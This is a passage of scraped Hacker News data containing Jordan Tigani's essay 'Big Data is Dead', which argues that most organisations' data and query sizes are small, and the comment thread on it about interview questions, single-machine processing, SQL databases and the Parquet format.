    "time": 1716750778
  },
  {
    "id": 40488844,
    "title": "The End of Big Data: Embracing Efficient Data Management and Decision-Making",
    "originLink": "https://motherduck.com/blog/big-data-is-dead/",
    "originBody": "GO BACK TO BLOG BIG DATA IS DEAD 2023/02/07 BY JORDAN TIGANI SUBSCRIBE TO MOTHERDUCK BLOG Also subscribe to other MotherDuck updates SUBMIT For more than a decade now, the fact that people have a hard time gaining actionable insights from their data has been blamed on its size. “Your data is too big for your puny systems,” was the diagnosis, and the cure was to buy some new fancy technology that can handle massive scale. Of course, after the Big Data task force purchased all new tooling and migrated from Legacy systems, people found that they still were having trouble making sense of their data. They also may have noticed, if they were really paying attention, that data size wasn’t really the problem at all. The world in 2023 looks different from when the Big Data alarm bells started going off. The data cataclysm that had been predicted hasn’t come to pass. Data sizes may have gotten marginally larger, but hardware has gotten bigger at an even faster rate. Vendors are still pushing their ability to scale, but practitioners are starting to wonder how any of that relates to their real world problems. WHO AM I AND WHY DO I CARE? For more than 10 years, I was one of the acolytes beating the Big Data drum. I was a founding engineer on Google BigQuery, and as the only engineer on the team that actually liked public speaking, I got to travel to conferences around the world to help explain how we were going to help folks withstand the coming data explosion. I used to query a petabyte live on stage, demonstrating that no matter how big and bad your data was, we would be able to handle it, no problem. This photo was me at Big Data Spain in 2012, warning of the dangers of giant datasets and promising relief if they just use our technology. Over the next few years I spent a lot of time debugging problems that customers were having with BigQuery. I co-wrote two books and really dug into how the product was being used. In 2018, I switched to product management, and my job was split between talking to customers, many of whom were the largest enterprises in the world, and analyzing product metrics. The most surprising thing that I learned was that most of the people using “Big Query” don’t really have Big Data. Even the ones who do tend to use workloads that only use a small fraction of their dataset sizes. When BigQuery came out, it was like science fiction for many people-- you literally couldn’t process data that fast in any other way. However, what was science fiction is now commonplace, and more traditional ways of processing your data have caught up. About this post This post will make the case that the era of Big Data is over. It had a good run, but now we can stop worrying about data size and focus on how we’re going to use it to make better decisions. I’ll show a number of graphs; these are all hand-drawn based on memory. If I did have access to the exact numbers, I wouldn’t be able to share them. But the important part is the shape, rather than the exact values. The data behind the graphs come from having analyzed query logs, deal post-mortems, benchmark results (published and unpublished), customer support tickets, customer conversations, service logs, and published blog posts, plus a bit of intuition. THE OBLIGATORY INTRO SLIDE For the last 10 years, every pitch deck for every big data product starts with a slide that looks something like this: We used a version of this slide for years at Google. When I moved to SingleStore, they were using their own version that had the same chart. I’ve seen several other vendors with something similar. This is the “scare” slide. Big Data is coming! You need to buy what I’m selling! The message was that old ways of handling data were not going to work. The acceleration of data generation was going to leave the data systems of yesteryear stuck in the mud, and anyone who embraced new ideas would be able to leapfrog their competitors. Of course, just because the amount of data being generated is increasing doesn’t mean that it becomes a problem for everyone; data is not distributed equally. Most applications do not need to process massive amounts of data. This has led to a resurgence in data management systems with traditional architectures; SQLite, Postgres, MySQL are all growing strongly, while “NoSQL” and even “NewSQL” systems are stagnating. MongoDB is the highest ranked NoSQL or otherwise scale-out database, and while it had a nice run-up over the years, it has been declining slightly recently, and hasn’t really made much headway against MySQL or Postgres, two resolutely monolithic databases. If Big Data were really taking over, you’d expect to see something different after all these years. Of course, the picture looks different in analytical systems, but in OLAP you see a massive shift from on-premise to cloud, and there aren’t really any scale-up cloud analytical systems to compare against. MOST PEOPLE DON’T HAVE THAT MUCH DATA The intended takeaway from the “Big Data is coming” chart was that pretty soon, everyone will be inundated by their data. Ten years in, that future just hasn’t materialized. We can validate this several ways: looking at data (quantitatively), asking people if it is consistent with their experience (qualitatively), and thinking it through from first principles (inductively). When I worked at BigQuery, I spent a lot of time looking at customer sizing. The actual data here is very sensitive, so I can’t share any numbers directly. However, I can say that the vast majority of customers had less than a terabyte of data in total data storage. There were, of course, customers with huge amounts of data, but most organizations, even some fairly large enterprises, had moderate data sizes. Customer data sizes followed a power-law distribution. The largest customer had double the storage of the next largest customer, the next largest customer had half of that, etc. So while there were customers with hundreds of petabytes of data, the sizes trailed off very quickly. There were many thousands of customers who paid less than $10 a month for storage, which is half a terabyte. Among customers who were using the service heavily, the median data storage size was much less than 100 GB. We found further support for this when talking to industry analysts (Gartner, Forrester, etc). We would extol our ability to handle massive data sets, and they would shrug. “This is nice,” they said, “but the vast majority of enterprises have data warehouses smaller than a terabyte.” The general feedback we got talking to folks in the industry was that 100 GB was the right order of magnitude for a data warehouse. This is where we focused a lot of our efforts in benchmarking. One of our investors decided to find out how big analytical data sizes really are and surveyed his portfolio companies, some which were post-exit (either had IPO’d or been acquired by larger organizations). These are tech companies, which are likely going to skew towards larger data sizes. He found that the largest B2B companies in his portfolio had around a terabyte of data, while the largest B2C companies had around 10 Terabytes of data. Most, however, had far less data. In order to understand why large data sizes are rare, it is helpful to think about where the data actually comes from. Imagine you’re a medium sized business, with a thousand customers. Let’s say each one of your customers places a new order every day with a hundred line items. This is relatively frequent, but it is still probably less than a megabyte of data generated per day. In three years you would still only have a gigabyte, and it would take millenia to generate a terabyte. Alternately, let’s say you have a million leads in your marketing database, and you’re running dozens of campaigns. Your leads table is probably still less than a gigabyte, and tracking each lead across each campaign still probably is only a few gigabytes. It is hard to see how this adds to massive data sets under reasonable scaling assumptions. To give a concrete example, I worked at SingleStore in 2020-2022, when it was a fast-growing Series E company with significant revenue and a unicorn valuation. If you added up the size of our finance data warehouse, our customer data, our marketing campaign tracking, and our service logs, it was probably only a few gigabytes. By any stretch of the imagination, this is not big data. THE STORAGE BIAS IN SEPARATION OF STORAGE AND COMPUTE. Modern cloud data platforms all separate storage and compute, which means that customers are not tied to a single form factor. This, more than scale out, is likely the single most important change in data architectures in the last 20 years. Instead of “shared nothing” architectures which are hard to manage in real world conditions, shared disk architectures let you grow your storage and your compute independently. The rise of scalable and reasonably fast object storage like S3 and GCS meant that you could relax a lot of the constraints on how you built a database. In practice, data sizes increase much faster than compute sizes. While popular descriptions of the benefits of storage and compute separation make it sound like you may choose to scale either one at any time, the two axes are not really equivalent. Misunderstanding of this point leads to a lot of the discussion of Big Data, because techniques for dealing with large compute requirements are different from dealing with large data. It is helpful to explore why this may be the case. All large data sets are generated over time. Time is almost always an axis in a data set. New orders come in every day. New taxi rides. New logging records. New games being played. If a business is static, neither growing or shrinking, data will increase linearly with time. What does this mean for analytic needs? Clearly data storage needs will increase linearly, unless you decide to prune the data (more on this later). But compute needs will likely not need to change very much over time; most analysis is done over the recent data. Scanning old data is pretty wasteful; it doesn’t change, so why would you spend money reading it over and over again? True, you might want to keep it around just in case you want to ask a new question of the data, but it is pretty trivial to build aggregations containing the important answers. Very often when a data warehousing customer moves from an environment where they didn’t have separation of storage and compute into one where they do have it, their storage usage grows tremendously, but their compute needs tend to not really change. In BigQuery, we had a customer who was one of the largest retailers in the world. They had an on-premise data warehouse that was around 100 TB of data. When they moved to the cloud, they ended up with 30 PB of data, a 300x increase. If their compute needs had also scaled up by a similar amount, they would have been spending billions of dollars on analytics. Instead, they spent a tiny fraction of that amount. This bias towards storage size over compute size has a real impact in system architecture. It means that if you use scalable object stores, you might be able to use far less compute than you had anticipated. You might not even need to use distributed processing at all. WORKLOAD SIZES ARE SMALLER THAN OVERALL DATA SIZES The amount of data processed for analytics workloads is almost certainly smaller than you think. Dashboards, for example, very often are built from aggregated data. People look at the last hour, or the last day, or the last week’s worth of data. Smaller tables tend to be queried more frequently, giant tables more selectively. A couple of years ago I did an analysis of BigQuery queries, looking at customers spending more than $1000 / year. 90% of queries processed less than 100 MB of data. I sliced this a number of different ways to make sure it wasn’t just a couple of customers who ran a ton of queries skewing the results. I also cut out metadata-only queries, which are a small subset of queries in BigQuery that don’t need to read any data at all. You have to go pretty high on the percentile range until you get into the gigabytes, and there are very few queries that run in the terabyte range. Customers with giant data sizes almost never queried huge amounts of data Customers with moderate data sizes often did fairly large queries, but customers with giant data sizes almost never queried huge amounts of data. When they did, it was generally because they were generating a report, and performance wasn’t really a priority. A large social media company would run reports over the weekend to prepare for executives on Monday morning; those queries were pretty huge, but they were only a tiny fraction of the hundreds of thousands of queries they ran the rest of the week. Even when querying giant tables, you rarely end up needing to process very much data. Modern analytical databases can do column projection to read only a subset of fields, and partition pruning to read only a narrow date range. They can often go even further with segment elimination to exploit locality in the data via clustering or automatic micro partitioning. Other tricks like computing over compressed data, projection, and predicate pushdown are ways that you can do less IO at query time. And less IO turns into less computation that needs to be done, which turns into lower costs and latency. There are acute economic pressures incentivizing people to reduce the amount of data they process. Just because you can scale out and process something very fast doesn’t mean you can do so inexpensively. If you use a thousand nodes to get a result, that is probably going to cost you an arm and a leg. The Petabyte query I used to run on stage to show off BigQuery cost $5,000 at retail prices. Very few people would want to run something so expensive. Note that the financial incentive to processing less data holds true even if you’re not using a pay-per-byte-scanned pricing model. If you have a Snowflake instance, if you can make your queries smaller, you can use a smaller instance, and pay less. Your queries will be faster, you can run more concurrently, and you generally will pay less over time. MOST DATA IS RARELY QUERIED A huge percentage of the data that gets processed is less than 24 hours old. By the time data gets to be a week old, it is probably 20 times less likely to be queried than from the most recent day. After a month, data mostly just sits there. Historical data tends to be queries infrequently, perhaps when someone is running a rare report. Data storage age patterns are a lot flatter. While a lot of data gets discarded pretty quickly, a lot of data just gets appended to the end of tables. The most recent year might only have 30% of the data but 99% of data accesses. The most recent month might have 5% of data but 80% of data accesses. The quiescing of data means that data working set sizes are more manageable than you would expect. If you have a petabyte table that has 10 years worth of data, you might rarely access any of the data older than the current day, which might have less than 50 GB compressed. THE BIG DATA FRONTIER KEEPS RECEDING One definition of “Big Data” is “whatever doesn’t fit on a single machine.. By that definition, the number of workloads that qualify has been decreasing every year. In 2004, when the Google MapReduce paper was written, it would have been very common for a data workload to not fit on a single commodity machine. Scaling up was expensive. In 2006, AWS launched EC2, and the only size of instance you could get was a single core and 2 GB of RAM. There were a lot of workloads that wouldn’t fit on that machine. Today, however, a standard instance on AWS uses a physical server with 64 cores and 256 GB of RAM. That’s two orders of magnitude more RAM. If you’re willing to spend a little bit more for a memory-optimized instance, you can get another two orders of magnitude of RAM. How many workloads need more than 24TB of RAM or 445 CPU cores? It used to be that larger machines were a lot more expensive. However, in the cloud, a VM that uses a whole server only costs 8x more than one that uses an 8th of a server. Cost scales up linearly with compute power, up through some very large sizes. In fact, if you look at the benchmarks published in the original dremel paper using 3,000 parallel nodes, you can get similar performance on a single node today (more on this to come). DATA IS A LIABILITY An alternate definition of Big Data is “when the cost of keeping data around is less than the cost of figuring out what to throw away.” I like this definition because it encapsulates why people end up with Big Data. It isn’t because they need it; they just haven’t bothered to delete it. If you think about many data lakes that organizations collect, they fit this bill entirely: giant, messy swamps where no one really knows what they hold or whether it is safe to clean them up. The cost of keeping data around is higher than just the cost to store the physical bytes. Under regulations like GDPR and CCPA, you are required to track all usage of certain types of data. Some data needs to be deleted within a certain period of time. If you have phone numbers in a parquet file that sit around for too long in your data lake somewhere, you may be violating statutory requirements. Beyond regulation, data can be an aid to lawsuits against you. Just as many organizations enforce limited email retention policies in order to reduce potential liability, the data in your data warehouse can likewise be used against you. If you’ve got logs from five years ago that would show a security bug in your code or missed SLA, keeping old data around can prolong your legal exposure. There is a possibly apocryphal story I’ve heard about a company keeping its data analytics capabilities secret in order to prevent them from being used during a legal discovery process. Code often suffers from what people call “bit rot” when it isn’t actively maintained. Data can suffer from the same type of problem; that is, people forget the precise meaning of specialized fields, or data problems from the past may have faded from memory. For example, maybe there was a short-lived data bug that set every customer id to null. Or there was a huge fraudulent transaction that made it look like Q3 2017 was a lot better than it actually was. Often business logic to pull out data from a historical time period can get more and more complicated. For example, there might be a rule like, “ if the date is older than 2019 use the revenue field, between 2019 and 2021 use the revenue_usd field, and after 2022 use the revenue_usd_audited field.” The longer you keep data around, the harder it is to keep track of these special cases. And not all of them can be easily worked around, especially if there is missing data. If you are keeping around old data, it is good to understand why you are keeping it. Are you asking the same questions over and over again? If that is the case, wouldn’t it be far less expensive in terms of storage and query costs to just store aggregates? Are you keeping it for a rainy day? Are you thinking that there are new questions you might want to ask? If so, how important is it? How likely is it that you’ll really need it? Are you really just a data hoarder? These are all important questions to ask, especially as you try to figure out the true cost of keeping the data. ARE YOU IN THE BIG DATA ONE PERCENT? Big Data is real, but most people may not need to worry about it. Some questions that you can ask to figure out if you’re a “Big Data One-Percenter”: Are you really generating a huge amount of data? If so, do you really need to use a huge amount of data at once? If so, is the data really too big to fit on one machine? If so, are you sure you’re not just a data hoarder? If so, are you sure you wouldn’t be better off summarizing? If you answer no to any of these questions, you might be a good candidate for a new generation of data tools that help you handle data at the size you actually have, not the size that people try to scare you into thinking that you might have someday. CONTENT Who am I and why do I care? The obligatory intro slide Most people don’t have that much data The storage bias in separation of storage and compute. Workload sizes are smaller than overall data sizes Most data is rarely queried The Big Data Frontier keeps receding Data is a Liability Are you in the BIg Data One Percent? NEXT POSTS 2023/01/24 - Ryan Boyd HOW TO ANALYZE SQLITE DATABASES IN DUCKDB 2023/01/31 - Ryan Boyd PYTHON FAKER FOR DUCKDB FAKE DATA GENERATION Using the Python Faker library to generate data for exploring DuckDB VIEW ALL",
    "commentLink": "https://news.ycombinator.com/item?id=40488844",
    "commentBody": "Big data is dead (2023) (motherduck.com)412 points by armanke13 10 hours agohidepastfavorite334 comments kmarc 7 hours agoWhen I was hiring data scientists for a previous job, my favorite tricky question was \"what stack/architecture would you build\" with the somewhat detailed requirements of \"6 TiB of data\" in sight. I was careful not to require overly complicated sums, I simply said it's MAX 6TiB I patiently listened to all the big query hadoop habla-blabla, even asked questions about the financials (hardware/software/license BOM) and many of them came up with astonishing tens of thousands of dollars yearly. The winner of course was the guy who understood that 6TiB is what 6 of us in the room could store on our smart phones, or a $199 enterprise HDD (or three of them for redundancy), and it could be loaded (multiple times) to memory as CSV and simply run awk scripts on it. I am prone to the same fallacy: when I learn how to use a hammer, everything looks like a nail. Yet, not understanding the scale of \"real\" big data was a no-go in my eyes when hiring. reply palata 5 hours agoparentOne thing that may have an impact on the answers: you are hiring them, so I assume they are passing a technical interview. So they expect that you want to check their understanding of the technical stack. I would not conclude that they over-engineer everything they do from such an answer, but rather just that they got tricked in this very artificial situation where you are in a dominant position and ask trick questions. I was recently in a technical interview with an interviewer roughly my age and my experience, and I messed up. That's the game, I get it. But the interviewer got judgemental towards my (admittedly bad) answers. I am absolutely certain that were the roles inverted, I could choose a topic I know better than him and get him in a similarly bad position. But in this case, he was in the dominant position and he chose to make me feel bad. My point, I guess, is this: when you are the interviewer, be extra careful not to abuse your dominant position, because it is probably counter-productive for your company (and it is just not nice for the human being in front of you). reply ufo 5 hours agorootparentFrom the point of view of the interviewee, it's impossible to guess if they expect you to answer \"no need for big data\" or if they expect you to answer \"the company is aiming for exponential growth so disregard the 6TB limit and architect for scalability\" reply valenterry 3 hours agorootparentIt doesn't matter. The answer should be \"It depends, what are the circumstances - do we expect high growth in the future? Is it gonna stay around 6TB? How and by whom will it be used and what for?\" Or, if you can guess what the interviewer is aiming for, state the assumption and go from there \"If we assume it's gonna stay atE.g., if a HN'er takes this as advice they're just as likely to be gated by some other interviewer who interprets hedging as a smell. If people in high stakes environments interpret hedging as a smell - run from that company as fast as you can. Hedging is a natural adult reasoning process. Do you really want to work with someone who doesn't understand that? reply llm_trw 3 hours agorootparentprevI once killed the deployment of a big data team in a large bank when I laid out in excruciating details exactly what they'd have to deal with during an interview. Last I heard theyd promoted one unix guy on the inside to baby sit a bunch of chron jobs on the biggest server they could find. reply palata 3 hours agorootparentprevSure, but as you said yourself: it's a trick question. How often does the employee have to answer trick questions without having any time to think in the actual job? As an interviewer, why not asking: \"how would you do that in a setup that doesn't have much data and doesn't need to scale, and then how would you do it if it had a ton of data and a big need to scale?\". There is no trick here, do you feel you lose information about the interviewee? reply hirsin 2 hours agorootparentTrick questions (although not known as such at the time) are the basis of most of the work we do? XY problem is a thing for a reason, and I cannot count the number of times my teams and I have ratholed on something complex only to realize we were solving for the wrong problem, i.e. A trick question. As a sibling puts it though, it's a matter of level. Senior/staff and above? Yeah, that's mostly what you do. Lower than that, then you should be able to mostly trust those upper folks to have seen through the trick. reply palata 1 hour agorootparent> are the basis of most of the work we do? I don't know about you, but in my work, I always have more than 3 seconds to find a solution. I can slowly think about the problem, sleep on it, read about it, try stuff, think about it while running, etc. I usually do at least some of those for new problems. Then of course there is a bunch of stuff that is not challenging and for which I can start coding right away. In an interview, those trick questions will just show you who already has experience with the problem you mentioned and who doesn't. It doesn't say at all (IMO) how good the interviewee is at tackling challenging problem. The question then is: do you want to hire someone who is good at solving challenging problems, or someone who already knows how to solve the one problem you are hiring them for? reply theamk 38 minutes agorootparentIf the interviewer expects you to answer entire design question in 3 seconds, that interview is pretty broken. Those questions should take longish time (minutes to tens of minutes), and should let candidate showcase their thought process. reply coryrc 43 minutes agorootparentprevOnce had a coworker write a long proposal to rewrite some big old application from Python to Go. I threw in a single comment: why don't we use the existing code as a separate executable? Turns out he was laid off and my suggestion was used. (Okay, I'm being silly, the layoff was a coincidence) reply theamk 43 minutes agorootparentprevbecause the interview is supposed to ask same questions as real job, and in real job there are rarely big hints like you are describing. On the other hand, \"hey I have 6TiB data, please prepare to analyze it, feel free to ask any questions for clarification but I may not know the answers\" is much more representative of a real-life task. reply zdragnar 3 hours agorootparentprevDepends on the level you're hiring for. At a certain point, the candidate needs to be able to identify the right tool for the job, including when that tool is not the usual big data tools but a simple script. reply whamlastxmas 4 hours agorootparentprevIs this like interviewing for a chef position for a fancy restaurant and when asked how to perfectly cook a steak, you preface it with “well you can either go to McDonald’s and get a burger, or…” It may not be reasonable to suggest that in a role that traditionally uses big data tools reply hnfong 3 hours agorootparentI see it more like \"it's 11pm and a family member suddenly wants to eat a steak at home, what would you do?\" The person who says \"I'm going drive back to the restaurant and take my professional equipment home to cook the steak\" is probably offering the wrong answer. I'm obviously not a professional cook, but presumably the ability to improvise with whatever tools you currently have is a desirable skill. reply palata 3 hours agorootparentHmm I would say that the equivalent to your 11pm question is more something like \"your sister wants to backup her holiday pictures on the cloud, how do you design it?\". The person who says \"I ask her 10 millions to build a data center\" is probably offering the wrong answer :-). reply bee_rider 2 hours agorootparentprevI’m not sure if you are referencing it intentionally or not, but some chefs (Gordon Ramsey for one) will ask an interviewee to make some scrambled eggs; something not super niche or specialized but enough to see what their technique is. It is a sort of “interview hack” example that’s been used to emphasize the idea of a simple unspecialized skill-test that went around a while ago. I guess upcoming chefs probably practice egg scrambling nowadays, ruining the value of the test. But maybe they could ask to make a bit of steak now. reply dkz999 4 hours agorootparentprevIdk, in this instance I feel pretty strongly that cloud, and solutions with unecessary overhead, are the fast food. The article proposes not eating it all the time. reply tored 3 hours agorootparentprevI think more like, how would you prepare and cook the best five course gala dinner for only $10. That requires true skill. reply drubio 1 hour agorootparentprevIt's almost a law \"all technical discussions devolve into interview mind games\", this industry has a serious interview/hiring problem. reply chx 6 hours agoparentprevhttps://x.com/garybernhardt/status/600783770925420546 (Gary Bernhardt of WAT fame): > Consulting service: you bring your big data problems to me, I say \"your data set fits in RAM\", you pay me $10,000 for saving you $500,000. This is from 2015... reply crowcroft 4 hours agorootparentI wonder if it's fair to revise this to 'your data set fits on NVME drives' these days. Astonishing how fast and how much storage you can get these days. reply xethos 2 hours agorootparentBased on a very brief search: Samsung's fastest NVME drives [0] could maybe keep up with the slowest DDR2 [1]. DDR5 is several orders of magnitude faster than both [2]. Maybe in a decade you can hit 2008 speeds, but I wouldn't consider updating the phrase before then (and probably not after, either). [0] https://www.tomshardware.com/reviews/samsung-980-m2-nvme-ssd... [1] https://www.tomshardware.com/reviews/ram-speed-tests,1807-3.... [2] https://en.wikipedia.org/wiki/DDR5_SDRAM reply dralley 2 hours agorootparentThe statement was \"fits on\", not \"matches the speed of\". reply fbdab103 2 hours agorootparentprevYou can always check available ram: https://yourdatafitsinram.net/ reply RandomCitizen12 5 hours agorootparentprevhttps://yourdatafitsinram.net/ reply rqtwteye 4 hours agoparentprevPlenty of people get offended if you tell them that their data isn’t really “big data”. A few years ago I had a discussion with one of my directors about a system IT had built for us with Hadoop, API gateways, multiple developers and hundreds of thousands of yearly cost. I told him that at our scale (now and any foreseeable future) I could easily run the whole thing on a USB drive attached to his laptop and a few python scripts. He looked really annoyed and I was never involved again with this project. I think it’s part of the BS cycle that’s prevalent in companies. You can’t admit that you are doing something simple. reply noisy_boy 3 hours agorootparentIn most non-tech companies, it comes down to the motive of the manager and in most cases it is expansion of reporting line and grabbing as much budget as possible. Using \"simple\" solutions runs counter to this central motivation. reply eloisant 1 hour agorootparent- the manager wants expansion - the developers want to get experience in a fancy stack to build up their resume Everyone benefits from the collective hallucination reply disqard 3 hours agorootparentprevThis is also true of tech companies. Witness how the \"GenAI\" hammer is being used right now at MS, Google, Meta, etc. reply mattbillenstein 7 hours agoparentprevI can appreciate the vertical scaling solution, but to be honest, this is the wrong solution for almost all use cases - consumers of the data don't want awk, and even if they did, spooling over 6TB for every kinda of query without partitioning or column storage is gonna be slow on a single cpu - always. I've generally liked BigQuery for this type of stuff - the console interface is good enough for ad-hoc stuff, you can connect a plethora of other tooling to it (Metabase, Tableau, etc). And if partitioned correctly, it shouldn't be too expensive - add in rollup tables if that becomes a problem. reply kjkjadksj 5 hours agorootparentHes hiring data scientists not building a service though. This might realistically be a one off analysis for those 6tb. At which point you are happy your data scientists has returned statistical information instead of spending another week making sure the pipeline works if someone puts a greek character in a field. reply data-ottawa 2 hours agorootparentEven if I'm doing a one off, depending on the task it can be easier/faster/more reliable to load 6TiB into a big query table than waiting hours for some task to complete and fiddling with parallelism and memory management. It's a couple hundred bucks a month and $36 to query the entire dataset, after partitioning thats not terrible. reply nostrademons 34 minutes agorootparentA 6T hard drive and Pandas will cost you a couple hundred bucks, one time purchase, and then last you for years (and several other data analysis jobs). It also doesn't require that you be connected to the Internet, doesn't require that you trust 3rd-party services, and is often faster (even in execution time) than spooling up BigQuery. You can always save an intermediate data set partitioned and massaged into whatever format makes subsequent queries easy, but that's usually application-dependent, and so you want that control over how you actually store your intermediate results. reply Stranger43 4 hours agorootparentprevAnd here we see this strange thing that data science people does in forgetting that 6TB is small change for any SQL server worth it's salt. Just dump it into Oracle, postgre, mssql, or mysql and be amazed by the kind of things you can do with 30year old data analysis technology on an modern computer. reply apwell23 4 hours agorootparentyou wouldn't have been a 'winner' per OP. real answer is loading it on their phones not on sqlserver or whatever. reply Stranger43 3 hours agorootparentTo be honest OP is kind of making the same mistake in assuming that the only real alternatives is \"new data science products\" and old school scripting exists as valuable tools. The extend people goes to to not recognize how much the people creating the SQL language and the relational database engines we now take for granted actually knew what they were doing, are a bit of an mystery to me. The right answer to any query that can be defined in SQL is pretty much always an SQL engine even if it's just sqlite running on an laptop. But somehow people seems to keep comming up with reasons not to use SQL. reply fifilura 6 hours agorootparentprevI agree with this. BigQuery or AWS s3/Athena. You shouldn't have to set up a cluster for data jobs these days. And it kind of points out the reason for going with a data scientist with the toolset he has in mind instead of optimizing for a commandline/embedded programmer. The tools will evolve in the direction of the data scientist, while the embedded approach is a dead end in lots of ways. You may have outsmarted some of your candidates, but you would have hired a person not suited for the job long term. reply orhmeh09 21 minutes agorootparentIt is actually pretty easy to do the same type of processing you would do on a cluster with AWS Batch. reply ryguyrg 3 hours agorootparentprevyou can scale vertically with a much better tech than awk. enter duckdb with columnar vectorized execution and full SQL support. :-) disclaimer: i work with the author at motherduck and we make a data warehouse powered by duckdb reply pyrale 5 hours agorootparentprevOnce you understand that 6tb fits on a hard drive, you can just as well put it in a run-of-the-mill pg instance, which metabase will reference just as easily. Hell, metabase is fine with even a csv file... reply crowcroft 4 hours agorootparentI worked in a large company that had a remote desktop instance with 256gb ram running a PG instance that analysts would log in to to do analysis. I used to think it was a joke of setup for such a large company. I later moved to a company with a fairly sophisticated setup with Databricks. While Databricks offered some QoL improvements, it didn't magically make all my queries run quickly, and it didn't allow me anything that I couldn't have done on the remote desktop setup. reply __alexs 6 hours agorootparentprevA moderately powerful desktop processor has memory bandwidth of over 50TB/s so yeah it'll take a couple of minutes sure. reply dahart 3 hours agorootparentRunning awk on an in-memory CSV will come nowhere even close to the memory bandwidth your machine is capable of. reply fijiaarone 6 hours agorootparentprevThe slow part of using awk is waiting for the disk to spin over the magnetic head. And most laptops have 4 CPU cores these days, and a multiprocess operating system, so you don’t have to wait for random access on a spinning plate to find every bit in order, you can simply have multiple awk commands running in parallel. Awk is most certainly a better user interface than whatever custom BrandQL you have to use in a textarea in a browser served from localhost:randomport reply hnfong 3 hours agorootparentI haven't been using spinning disks for perf critical tasks for a looong time... but if I recall correctly, using multiple processes to access the data is usually counter-productive since the disk has to keep repositioning its read heads to serve the different processes reading from different positions. Ideally if the data is laid out optimally on the spinning disk, a single process reading the data would result in a mostly-sequential read with much less time wasted on read head repositioning seeks. In the odd case where the HDD throughput is greater than a single-threaded CPU processing for whatever reason (eg. you're using a slow language and complicated processing logic?), you can use one optimized process to just read the raw data, and distribute the CPU processing to some other worker pool. reply Androider 4 hours agorootparentprev> The slow part of using awk is waiting for the disk to spin over the magnetic head. If we're talking about 6 TB of data: - You can upgrade to 8 TB of storage on a 16-inch MacBook Pro for $2,200, and the lowest spec has 12 CPU cores. With up to 400 GB/s of memory bandwidth, it's truly a case of \"your big data problem easily fits on my laptop\". - Contemporary motherboards have 4 to 5 M.2 slots, so you could today build a 12 TB RAID 5 setup of 4 TB Samsung 990 PRO NVMe drives for ~ 4 x $326 = $1,304. Probably in a year or two there will be 8 TB NVMe's readily available. Flash memory is cheap in 2024! reply bewaretheirs 1 hour agorootparentYou can go further. There are relatively cheap adapter boards which let you stick 4 M.2 drives in a single PCIe x16 slot; you can usually configure a x16 slot to be bifurcated (quadfurcated) as 4 x (x4). To pick a motherboard at quasi-random: Tyan HX S8050. Two M.2 on the motherboard. 20 M.2 drives in quadfurcated adapter cards in the 5 PCIe x16 slots And you can connect another 6 NVMe x4 devices to the MCIO ports. You might also be able to hook up another 2 to the SFF-8643 connectors. This gives you a grand total of 28-30 x4 NVME devices on one not particularly exotic motherboard, using most of the 128 regular PCIe lanes available from the CPU socket. reply mrtimo 5 hours agoparentprev.parquet files are completely underrated, many people still do not know about the format! .parquet preserves data types (unlike CSV) They are 10x smaller than CSV. So 600GB instead of 6TB. They are 50x faster to read than CSV They are an \"open standard\" from Apache Foundation Of course, you can't peek inside them as easily as you can a CSV. But, the tradeoffs are worth it! Please promote the use of .parquet files! Make .parquet files available for download everywhere .csv is available! reply thesz 5 hours agorootparentParquet is underdesigned. Some parts of it do not scale well. I believe that Parquet files have rather monolithic metadata at the end and it has 4G max size limit. 600 columns (it is realistic, believe me), and we are at slightly less than 7.2 millions row groups. Give each row group 8K rows and we are limited to 60 billion rows total. It is not much. The flatness of the file metadata require external data structures to handle it more or less well. You cannot just mmap it and be good. This external data structure most probably will take as much memory as file metadata, or even more. So, 4G+ of your RAM will be, well, used slightly inefficiently. (block-run-mapped log structured merge tree in one file can be as compact as parquet file and allow for very efficient memory mapped operations without additional data structures) Thus, while parqet is a step, I am not sure it is a step in definitely right direction. Some aspects of it are good, some are not that good. reply Renaud 4 hours agorootparentParquet is not a database, it's a storage format that allows efficient column reads so you can get just the data you need without having to parse and read the whole file. Most tools can run queries across parquet files. Like everything, it has its strengths and weaknesses, but in most cases, it has better trade-offs over CSV if you have more than a few thousand rows. reply maxnevermind 1 hour agorootparentprev> 7.2 millions row groups Why would you need 7.2 mil row groups? Row group size when stored in HDFS is usually equal to HDFS bock size by default, which is 128MB 7.2 mil * 128MB ~ 1PB You have a single parquet file 1PB in size? reply imiric 4 hours agorootparentprevWhat format would you recommend instead? reply datadeft 4 hours agorootparentprevNobody is forcing you to use a single Parquet file. reply apwell23 4 hours agorootparentprevsome critiques of parquet by andy pavlo https://www.vldb.org/pvldb/vol17/p148-zeng.pdf reply jjgreen 3 hours agorootparentprevPlease promote the use of .parquet files! apt-cache search parquetMaybe later reply seabass-labrax 2 hours agorootparentParquet is a file format, not a piece of software. 'apt install csv' doesn't make any sense either. reply fhars 1 hour agorootparentIf you want to shine with snide remarks, you should at least understand the point being made: $ apt-cache search csvwc -l 225 $ apt-cache search parquetwc -l 0 reply jjgreen 1 hour agorootparentprevThere is no support for parquet in Debian, by contrast apt-cache search csvwc -l 259 reply riku_iki 3 hours agorootparentprev> They are 50x faster to read than CSV I actually benchmarked this and duckdb CSV reader is faster than parquet reader. reply wenc 2 hours agorootparentI would love to see the benchmarks. That is not my experience, except in the rare case of a linear read (in which CSV is much easier to parse). CSV underperforms in almost every other domain, like joins, aggregations, filters. Parquet lets you do that lazily without reading the entire Parquet dataset into memory. reply riku_iki 2 hours agorootparent> That is not my experience, except in the rare case of a linear read (in which CSV is much easier to parse). Yes, I think duckdb only reads CSV, then projects necessary data into internal format (which is probably more efficient than parquet, again based on my benchmarks), and does all ops (joins, aggregations) on that format. reply wenc 2 hours agorootparentYes, it does that, assuming you read in the entire CSV, which works for CSVs that fit in memory. With Parquet you almost never read in the entire dataset and it's fast on all the projections, joins, etc. while living on disk. reply riku_iki 2 hours agorootparent> which works for CSVs that fit in memory. what? Why CSV is required to fit in memory in this case? I tested CSVs which are far larger than memory, and it works just fine. reply xnx 2 hours agorootparentprevFor how many rows? reply riku_iki 2 hours agorootparent10B reply ddalex 5 hours agorootparentprevWhy is .parquet better than protobuf? reply sdenton4 4 hours agorootparentParquet is columnar storage, which is much faster for querying. And typically for protobuf you deserialize each row, which has a performance cost - you need to deserialize the whole message, and can't get just the field you want. So, of you want to query a giant collection of protobufs, you end up reading and deserializing every record. For parquet, you get much closer to only reading what you need. reply sph 5 hours agorootparentprevThird consecutive time in 86 days that you mention .parquet files. I am out of my element here, but it's a bit weird reply ok_computer 5 hours agorootparentSometimes when people discover or extensively use something they are eager to share in contexts they think are relevant. There is an issue when those contexts become too broad. 3 times across 3 months is hardly astroturfing for big parquet territory. reply 